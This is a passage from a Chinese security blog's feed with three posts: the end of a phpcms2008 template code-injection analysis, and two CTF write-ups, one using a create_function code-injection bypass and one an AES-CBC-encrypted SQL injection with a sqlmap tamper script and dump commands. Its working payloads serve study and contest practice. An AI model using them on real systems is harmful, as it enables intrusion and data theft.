php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">tag_()&#123;&#125;assert($_GET[<span class="number">1</span>]);&#123;<span class="comment">//../rss也可以成功</span></div><div class="line">tag_()&#123;&#125;;assert($_GET[<span class="number">1</span>]);&#123;<span class="comment">//../rss会失败</span></div><div class="line">tag_()&#123;&#125;;php代码;assert($_GET[<span class="number">1</span>]);&#123;<span class="comment">//../rss成功</span></div></pre></td></tr></table></figure><p><strong>2.为什么加//</strong></p><p><strong>为了注释后面的代码，避免产生语法错误，不明白的可以看上图中的代码</strong></p><p><strong>3.{这个符号</strong></p><p><strong>因为后面的注释注释掉了{,所以需要加一个{去闭合代码最后的},否则会出语法错误</strong></p><h3 id="ayload构造"><a href="#ayload构造" class="headerlink" title="ayload构造:"></a>ayload构造:</h3><p><strong>1.简化后的payload：</strong></p><pre><code>type.php?template=tag_(){}assert($_GET[1]);{//../rss</code></pre><h3 id="漏洞总结："><a href="#漏洞总结：" class="headerlink" title="漏洞总结："></a>漏洞总结：</h3><p><strong>该漏洞可以总结为：代码根据传入的参数将/templates/default/phpcms目录下对应的.html模板文件渲染生成为/data/cache_template目录下.tpl.php模板缓存文件的这个过程中，由于输入是可控的，导致可以将php恶意代码写入php文件当中，从而产生任意代码执行</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;phpcms2008-type-php代码执行漏洞分析与复现&quot;&gt;&lt;a href=&quot;#phpcms2008-type-php代码执行漏洞分析与复现&quot; class=&quot;headerlink&quot; title=&quot;phpcms2008 type.php代码执行漏洞分析与复现&quot;&gt;
      
    
    </summary>
    
      <category term="代码审计" scheme="https://c1aysec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://c1aysec.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Code-Breaking Puzzles挑战</title>
    <link href="https://c1aysec.github.io/2018/11/30/Code-Breaking%20Puzzles%E6%8C%91%E6%88%98/"/>
    <id>https://c1aysec.github.io/2018/11/30/Code-Breaking Puzzles挑战/</id>
    <published>2018-11-30T11:00:05.000Z</published>
    <updated>2019-11-08T14:10:15.521Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Code-Breaking-Puzzles挑战"><a href="#Code-Breaking-Puzzles挑战" class="headerlink" title="Code-Breaking Puzzles挑战"></a>Code-Breaking Puzzles挑战</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>来自P师傅小密圈二周年的Code-Breaking Puzzles挑战的题目</strong></p><h3 id="easy-function"><a href="#easy-function" class="headerlink" title="easy - function"></a>easy - function</h3><p><strong>题目代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</div><div class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</div><div class="line">    show_source(<span class="keyword">__FILE__</span>);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    $action(<span class="string">''</span>, $arg);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>题目环境为PHP/7.2.12加上Apache/2.4.25 (Debian)</strong></p><p><strong>首先通过<code>$action(&#39;&#39;, $arg);</code>可以想到PHP的动态代码执行，通过这里面的参数可以看出这里应该使用<code>create_function</code>这个函数去进行代码执行，关于这个函数的执行流程如下：</strong></p><pre><code>1.获取参数, 函数体;2.拼凑一个”function __lambda_func (参数) { 函数体;} “的字符串;3.eval;4.通过__lambda_func在函数表中找到eval后得到的函数体, 找不到就出错;5.定义一个函数名:”\000_lambda_” . count(anonymous_functions)++;6.用新的函数名替换__lambda_func;7.返回新的函数。</code></pre><p><strong>以上流程可以简单理解为在使用该函数时会生成一个匿名函数，该函数的第一个参数会作为匿名函数的参数传入，该函数的第二个参数为匿名函数要执行的代码段，看下面的代码实例：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $func=create_function(<span class="string">'$a,$b'</span>,<span class="string">'echo $a+$b;'</span>);</div><div class="line">    $func(<span class="number">1</span>,<span class="number">2</span>);</div><div class="line">    <span class="comment">//3</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>这段代码的执行过程等价于</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">anonymous_func</span><span class="params">($a,b)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">        <span class="keyword">echo</span> $a+$b;</div><div class="line">&#125;</div><div class="line">    anonymous_func(<span class="number">1</span>,<span class="number">2</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>于是有了一个思路，这里可以传入<code>action=create_function&amp;arg=}phpinfo();/*</code>去执行phpinfo,这样构造的原因是因为这里通过<code>create_function</code>生成的匿名函数并没有赋值给任何变量，所以无法调用该匿名函数，但是由于此处的环境是php的<code>eval</code>环境，所以可以通过<code>}</code>去闭合该匿名函数，之后就执行任意代码了，而这里的<code>/*</code>用来注释后面多出的代码，这里执行的代码如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">create_function(<span class="string">''</span>,<span class="string">'&#125;phpinfo();/*'</span>);</div></pre></td></tr></table></figure><p><strong>实际执行过程变为了如下代码</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">anonymous_func</span><span class="params">()</span></span>&#123;&#125;phpinfo();\*&#125; </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><p><strong>于是便可以成功执行phpinfo,但是这道题里只是这样构造是不可以的，这里还需要绕过对传入的<code>$action</code>的正则检查，通过正则可以看出<code>$action</code>的内容不能只包含数字字母和<code>_</code>，在这里面卡了好久，于是看了P牛师傅的讲解，这里可以通过在函数名前加上<code>\</code>去绕过，构造<code>action=\create_function&amp;arg=}phpinfo();/*</code>就可以成功执行phpinfo</strong></p><p><img src="http://pic.c1imber.top/blog/20181130/oNzIUYcJHOL4.png" alt="mark"></p><p><strong>至于函数前面为什么可以加<code>\</code>,P牛师傅也给出了详细的解释，这里用到了php当中的命名空间，在php当中有一个默认的命名空间为<code>\</code>，PHP当中的所有原生函数和类都在这个命名空间下，平常我们在使用函数的时候直接写函数名去调用函数实际上用的是相对路径，而在函数名前面加上<code>\</code>用的是绝对路径去调用函数</strong></p><p><strong>接下来尝试使用命令执行函数执行命令，但是发现命令执行函数都被禁用掉了</strong><br><img src="http://pic.c1imber.top/blog/20181130/i3Ar2ajDTduJ.png" alt="mark"></p><p><strong>只能通过执行代码的方式寻找flag文件了</strong></p><p><strong>寻找flag文件的位置</strong></p><pre><code>action=\create_function&amp;arg=}print_r(scandir(&quot;/var/www/&quot;));/*</code></pre><p><strong>找到flag文件的位置在<code>/var/www</code>目录下</strong></p><p><img src="http://pic.c1imber.top/blog/20181130/lv67vOhsSTJO.png" alt="mark"></p><p><strong>读取flag</strong></p><pre><code>action=\create_function&amp;arg=}echo file_get_contents(&quot;/var/www/flag_h0w2execute_arb1trary_c0de&quot;);/*</code></pre><p><img src="http://pic.c1imber.top/blog/20181130/LHgNeuJvbjkm.png" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Code-Breaking-Puzzles挑战&quot;&gt;&lt;a href=&quot;#Code-Breaking-Puzzles挑战&quot; class=&quot;headerlink&quot; title=&quot;Code-Breaking Puzzles挑战&quot;&gt;&lt;/a&gt;Code-Breaking Puz
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2018湖湘杯注入题writeup</title>
    <link href="https://c1aysec.github.io/2018/11/19/2018%E6%B9%96%E6%B9%98%E6%9D%AF%E6%B3%A8%E5%85%A5%E9%A2%98writeup/"/>
    <id>https://c1aysec.github.io/2018/11/19/2018湖湘杯注入题writeup/</id>
    <published>2018-11-19T11:30:56.000Z</published>
    <updated>2018-12-20T01:51:42.981Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2018湖湘杯注入题writeup"><a href="#2018湖湘杯注入题writeup" class="headerlink" title="2018湖湘杯注入题writeup"></a>2018湖湘杯注入题writeup</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>这段时间事情很多，导致这次比赛没有报上名，周日总算闲了下来，看到师傅在群里发了几个题目的链接，于是滑了一波水，在这里记录一下</strong></p><h3 id="WEB-Code-Check"><a href="#WEB-Code-Check" class="headerlink" title="WEB Code Check"></a>WEB Code Check</h3><p><strong>其实昨天写这道题的时候并不知道这个题的题目是什么（有点尴尬），打开题目发现是一个登陆框，进行正常的登陆流程时会出现如下的错误，所以猜测该登陆功能可能不能正常使用</strong><br><img src="http://pic.c1imber.top/blog/20181119/4OOqnC1qMaXC.png" alt="mark"><br><strong>看到登陆处显示平台正在停机维护，不能正常使用应该和这个有一些关系吧</strong><br><img src="http://pic.c1imber.top/blog/20181119/pIrsEaltyAY1.png" alt="mark"><br><strong>接下来查看页面源代码，尝试发现问题，看到有一处连接</strong></p><pre><code>http://39.108.176.234:49882/news/list.php?id=b3FCRU5iOU9IemZYc1JQSkY0WG5JZz09</code></pre><p><img src="http://pic.c1imber.top/blog/20181119/6bNnKTXanQT5.png" alt="mark"><br><strong>打开后是一个显示信息的页面</strong><br><img src="http://pic.c1imber.top/blog/20181119/kPv8QXKJFJmq.png" alt="mark"><br><strong>id参数可能是存在注入的，id的值看起来像是一串base64，于是猜测可能是base64编码后的sql注入，但是在尝试base64解码的时候，第二次解码的时候就不能解码了，会出现乱码</strong></p><p><strong>接下来，偶然发现了一处目录遍历，此处泄露了list.php的源码</strong><br><img src="http://pic.c1imber.top/blog/20181119/vBzDRTmHetEN.png" alt="mark"></p><p><strong>list.php源码如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</div><div class="line"><span class="keyword">require_once</span> <span class="string">'../config.php'</span>;</div><div class="line"><span class="comment">//解密过程</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($data)</span></span>&#123;</div><div class="line">$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,<span class="string">''</span>,MCRYPT_MODE_CBC,<span class="string">''</span>);</div><div class="line">mcrypt_generic_init($td,<span class="string">'ydhaqPQnexoaDuW3'</span>,<span class="string">'2018201920202021'</span>);</div><div class="line">$data = mdecrypt_generic($td,base64_decode(base64_decode($data)));</div><div class="line">mcrypt_generic_deinit($td);</div><div class="line">mcrypt_module_close($td);</div><div class="line"><span class="keyword">if</span>(substr(trim($data),<span class="number">-7</span>)!==<span class="string">'hxb2018'</span>)&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;script&gt;window.location.href="/index.php";&lt;/script&gt;'</span>;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">return</span> substr(trim($data),<span class="number">0</span>,strlen(trim($data))<span class="number">-7</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">$id=decode($_GET[<span class="string">'id'</span>]);</div><div class="line">$sql=<span class="string">"select id,title,content,time from notice where id=$id"</span>;</div><div class="line">$info=$link-&gt;query($sql);</div><div class="line">$arr=$info-&gt;fetch_assoc();</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html lang=<span class="string">"en"</span>&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta charset=<span class="string">"UTF-8"</span>&gt;</div><div class="line">&lt;title&gt;X公司HR系统V1<span class="number">.0</span>&lt;/title&gt;</div><div class="line">&lt;style&gt;.body&#123;width:<span class="number">600</span>px;height:<span class="number">500</span>px;margin:<span class="number">0</span> auto&#125;.title&#123;color:red;height:<span class="number">60</span>px;line-height:<span class="number">60</span>px;font-size:<span class="number">30</span>px;font-weight:<span class="number">700</span>;margin-top:<span class="number">75</span>pt;border-bottom:<span class="number">2</span>px solid red;text-align:center&#125;.content,.title&#123;margin:<span class="number">0</span> auto;width:<span class="number">600</span>px;display:block&#125;.content&#123;height:<span class="number">30</span>px;line-height:<span class="number">30</span>px;font-size:<span class="number">18</span>px;margin-top:<span class="number">40</span>px;text-align:left;color:<span class="comment">#828282&#125;&lt;/style&gt;</span></div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;div class="body"&gt;</div><div class="line">&lt;div class="title"&gt;&lt;?php echo $arr['title']?&gt;&lt;/div&gt;</div><div class="line">&lt;div class="content"&gt;&lt;?php echo $arr['content']?&gt;&lt;/div&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure><p><strong>可以看到此处的id参数进行了AES加密处理，加密模式为CBC模式，之后服务端会对id参数进行解密，之后将解密的结果拼接进sql语句，从而产生了sql注入，源码中泄露了AES加密解密的key(密钥)和iv(初始化向量)，有了key和iv这两部分，就可以随意的构造sql注入的payload了</strong></p><p><strong>解密代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $data=<span class="string">"b3FCRU5iOU9IemZYc1JQSkY0WG5JZz09"</span>;</div><div class="line">$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,<span class="string">''</span>,MCRYPT_MODE_CBC,<span class="string">''</span>);</div><div class="line">mcrypt_generic_init($td,<span class="string">'ydhaqPQnexoaDuW3'</span>,<span class="string">'2018201920202021'</span>);</div><div class="line">$data = mdecrypt_generic($td,base64_decode(base64_decode($data)));</div><div class="line">mcrypt_generic_deinit($td);</div><div class="line">mcrypt_module_close($td);</div><div class="line"><span class="keyword">echo</span> substr(trim($data),<span class="number">0</span>,strlen(trim($data))<span class="number">-7</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20181119/uGcgDrNkBPfE.png" alt="mark"></p><p><strong>根据解密的代码，结合泄露的key和iv，很容易的编写出生成payload的加密代码，构造延时注入的POC，代码如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$payload=<span class="string">"1 and sleep(5)-- hxb2018"</span>;</div><div class="line">$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,<span class="string">''</span>,MCRYPT_MODE_CBC,<span class="string">''</span>);</div><div class="line">mcrypt_generic_init($td,<span class="string">'ydhaqPQnexoaDuW3'</span>,<span class="string">'2018201920202021'</span>);</div><div class="line">$data = base64_encode(base64_encode(mcrypt_generic($td,$payload)));</div><div class="line">mcrypt_generic_deinit($td);</div><div class="line">mcrypt_module_close($td);</div><div class="line"><span class="keyword">echo</span> $data;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20181119/L3YFbRXIz7mV.png" alt="mark"></p><p><strong>将经过处理的POC传入到id参数请求</strong></p><pre><code>http://39.108.176.234:49882/news/list.php?id=dTFmeVF0RmtWN2ZYSVBiMWpxNCt1d2p3YWJzVlN4WE1xU0tEbmQ2RHlEMD0=</code></pre><p><strong>发现页面响应延时了5s，说明sql语句执行了，确实是存在注入的</strong><br><img src="http://pic.c1imber.top/blog/20181119/FeHLwaKWIQcn.png" alt="mark"></p><p><strong>为了方便，用python编写sqlmap的tamper脚本对id参数进行相应的处理，实现自动化注入，代码如下:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#编写sqlmap tamper脚本aes_cbc.py</span></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line"><span class="string">Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)</span></div><div class="line"><span class="string">See the file 'doc/COPYING' for copying permission</span></div><div class="line"><span class="string">"""</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"></div><div class="line"><span class="keyword">from</span> lib.core.data <span class="keyword">import</span> kb</div><div class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</div><div class="line"></div><div class="line">__priority__ = PRIORITY.NORMAL</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line"><span class="string">    hxb2018:AES CBC encrypt sql injection</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">    &gt;&gt;&gt; tamper('1 and sleep(5)-- ')</span></div><div class="line"><span class="string">    dTFmeVF0RmtWN2ZYSVBiMWpxNCt1d2p3YWJzVlN4WE1xU0tEbmQ2RHlEMD0=</span></div><div class="line"><span class="string">    """</span></div><div class="line">    <span class="keyword">return</span> encrypt(payload)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(payload)</span>:</span></div><div class="line">    payload=payload+<span class="string">"hxb2018"</span></div><div class="line">    key=<span class="string">"ydhaqPQnexoaDuW3"</span></div><div class="line">    iv=<span class="string">"2018201920202021"</span></div><div class="line">    cipher = AES.new(key,AES.MODE_CBC,iv)</div><div class="line">    <span class="keyword">if</span>(len(payload)%<span class="number">16</span>!=<span class="number">0</span>):</div><div class="line">        payload=payload+(<span class="string">'\0'</span>*(<span class="number">16</span>-len(payload)%<span class="number">16</span>))</div><div class="line">        <span class="keyword">return</span> base64.b64encode(base64.b64encode(cipher.encrypt(payload)))</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> base64.b64encode(base64.b64encode(cipher.encrypt(payload)))</div></pre></td></tr></table></figure><p><strong>sqlmap判断存在注入</strong><br>    sqlmap -u “<a href="http://39.108.176.234:49882/news/list.php?id=1" target="_blank" rel="external">http://39.108.176.234:49882/news/list.php?id=1</a>“ –tamper “aes_cbc.py”</p><p><img src="http://pic.c1imber.top/blog/20181119/UekYVNUV0sqg.png" alt="mark"></p><p><strong>获取flag</strong></p><pre><code>sqlmap -u &quot;http://39.108.176.234:49882/news/list.php?id=1&quot; --tamper &quot;aes_cbc.py&quot; --dump -T &quot;notice2&quot; -D &quot;mozhe_discuz_stormgroup&quot;</code></pre><p><img src="http://pic.c1imber.top/blog/20181119/J0LVhOx3QhPD.png" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2018湖湘杯注入题writeup&quot;&gt;&lt;a href=&quot;#2018湖湘杯注入题writeup&quot; class=&quot;headerlink&quot; title=&quot;2018湖湘杯注入题writeup&quot;&gt;&lt;/a&gt;2018湖湘杯注入题writeup&lt;/h1&gt;&lt;h3 id=&quot;序&quot;&gt;&lt;a
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
</feed>
